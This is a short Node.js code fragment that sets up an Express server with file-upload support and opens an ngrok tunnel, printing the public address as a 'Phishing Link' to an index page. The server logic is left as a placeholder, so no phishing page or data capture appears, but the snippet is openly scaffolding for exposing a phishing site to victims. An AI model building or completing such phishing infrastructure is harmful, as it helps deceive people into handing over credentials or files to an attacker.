const express = require('express');
const multer = require('multer');
const ngrok = require('ngrok');
const app = express();

 // ... paste full server code

 (async () => {
  const url = await ngrok.connect({
    proto: 'http',
    addr: 3000,
    region: 'us'
  });
  console.log('🚀 Phishing Link: ' + url + '/index.html');
 })();

app.listen(3000);